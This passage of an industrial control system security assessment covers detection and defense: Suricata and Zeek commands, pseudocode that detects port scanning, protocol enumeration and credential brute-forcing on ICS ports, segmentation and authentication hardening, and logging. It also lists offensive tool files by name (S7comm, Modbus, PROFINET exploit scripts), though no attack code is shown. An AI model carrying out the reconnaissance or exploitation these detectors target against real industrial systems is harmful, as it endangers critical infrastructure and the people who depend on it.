  - High: 15 (weak security configs)
  - Medium: 7 (outdated firmware)

---

## Detection & Defense Recommendations

### Network Monitoring

**Deploy Protocol-Aware IDS**:
```bash
# Suricata with all ICS protocol rules
suricata -c /etc/suricata/suricata.yaml -i ics_monitor_interface \
    --include configs/suricata_rules/ics_malware_detection.rules \
    --include configs/suricata_rules/opcua_detection.rules \
    --include configs/suricata_rules/profinet_detection.rules \
    --include configs/suricata_rules/bacnet_detection.rules

# Zeek with ICS protocol analyzers
zeek -i ics_monitor_interface \
    configs/zeek/ics_detection.zeek \
    configs/zeek/opcua_monitor.zeek \
    configs/zeek/profinet_monitor.zeek \
    configs/zeek/bacnet_monitor.zeek
```

**Reconnaissance Detection**:
```python
# Detect reconnaissance patterns
def detect_reconnaissance():
    """Detect network reconnaissance activity"""
    
    # Pattern 1: Port scanning
    # Multiple connection attempts to ICS ports from single source
    detect_port_scan(ports=[102, 502, 44818, 4840, 47808, 2222])
    
    # Pattern 2: Protocol enumeration
    # Multiple S7Comm SZL reads, CIP ListIdentity, OPC-UA Browse
    detect_enumeration_burst(threshold=10, time_window=60)
    
    # Pattern 3: Credential testing
    # Multiple authentication attempts with different credentials
    detect_auth_bruteforce(threshold=5, time_window=300)
    
    # Pattern 4: Tag/symbol reading spree
    # Reading large numbers of tags in short time
    detect_tag_enumeration(threshold=100, time_window=600)
```

### Access Control

**Network Segmentation**:
```
[IT Network (Corporate)]
         |
    Firewall (DMZ)
         |
[Level 3: SCADA/HMI] <- Read-only access to Level 2
         |
    Firewall + IDS
         |
[Level 2: Supervisory Control] <- Limited access to Level 1
         |
    Firewall + IDS
         |
[Level 1: PLCs and Controllers] <- Isolated from Level 0
         |
    Unidirectional Gateway
         |
[Level 0: Field Devices] <- No external access
```

**Authentication & Authorization**:
```yaml
# Implement authentication for all ICS protocols
s7comm_auth:
  - Enable protection level 3 on all S7 PLCs
  - Require password for read/write operations
  - Change default passwords

opcua_auth:
  - Disable anonymous authentication
  - Require username/password or certificate
  - Enable SecurityMode=SignAndEncrypt

cip_auth:
  - Enable CIP Security object (Class 0x5D)
  - Require authentication for configuration
  - Implement role-based access control
```

### Visibility & Logging

**Asset Inventory**:
```python
# Maintain accurate asset inventory
def maintain_asset_inventory():
    """Continuous asset discovery and inventory management"""
    
    # Passive monitoring
    discovered_assets = passive_network_discovery()
    
    # Compare with known asset database
    new_assets = compare_with_inventory(discovered_assets)
    
    if new_assets:
        alert(severity='HIGH',
              message=f'{len(new_assets)} unauthorized devices detected',
              details=new_assets,
              action='Investigate and remove if unauthorized')
```

**Audit Logging**:
```python
# Comprehensive audit logging
def log_ics_activity():
    """Log all ICS protocol activity"""
    
    # Log all write operations
    log_s7comm_writes(destination='siem')
    log_opcua_writes(destination='siem')
    log_cip_writes(destination='siem')
    log_modbus_writes(destination='siem')
    
    # Log all configuration changes
    log_plc_downloads(destination='siem')
    log_firmware_updates(destination='siem')
    
    # Log all authentication events
    log_authentication(destination='siem')
```

---

## Tool Cross-References

### Attack Tools Used
- **S7Comm Framework**: `tools/s7comm_security_framework/s7comm_exploit.py` (lines 1-1316)
- **CIP Assessment**: `tools/cip_security_assessment/cip_exploiter.py` (lines 1-1480)
- **OPC-UA Framework**: `tools/opcua_security_framework/opcua_exploit.py` (lines 1-1069)
- **Modbus Toolkit**: `tools/modbus-stealth-toolkit/modbus_stealth_attack.py` (lines 1-2195)
- **PROFINET Exploitation**: `tools/profinet_exploitation/profinet_exploit.py` (lines 1-1080)
- **BACnet Assessment**: `tools/bacnet_security_assessment/bacnet_assessment.py` (lines 1-1379)

### Detection Rules Used
- **Suricata ICS Rules**: `configs/suricata_rules/ics_malware_detection.rules` (SID 400001-400016)
- **Suricata OPC-UA**: `configs/suricata_rules/opcua_detection.rules` (SID 410001-410012)
- **Suricata PROFINET**: `configs/suricata_rules/profinet_detection.rules` (SID 420001-420012)
- **Suricata BACnet**: `configs/suricata_rules/bacnet_detection.rules` (SID 430001-430015)
- **Zeek Monitors**: `configs/zeek/*.zeek` (all ICS protocol monitors)

### Documentation References
- **Protocol References**: `docs/protocol_quick_reference/*.md` (all 7 protocols)
- **Testing Guides**: `tools/*/TESTING.md` (all tool testing guides)

---

## Legal & Ethical Considerations

**WARNING**: Network reconnaissance of ICS systems without authorization is illegal.

**Authorized Use Cases**:
- Red team exercises with signed authorization
- Penetration testing with statement of work
- Security assessments with asset owner approval
- Research in isolated lab environments

**Legal Requirements**:
- Written authorization from network owner
- Defined scope and rules of engagement
- Incident response plan in place
- Legal counsel review of activities

**Prohibited Activities**:
- Unauthorized scanning of production networks
- Accessing systems without permission
- Disrupting critical infrastructure
- Violating CFAA, CISA, or other cybersecurity laws

---

**Document Version**: 1.0  
**Last Updated**: 2024-01-15  
**Author**: Ridpath  
**Classification**: RESTRICTED - Authorized Personnel Only
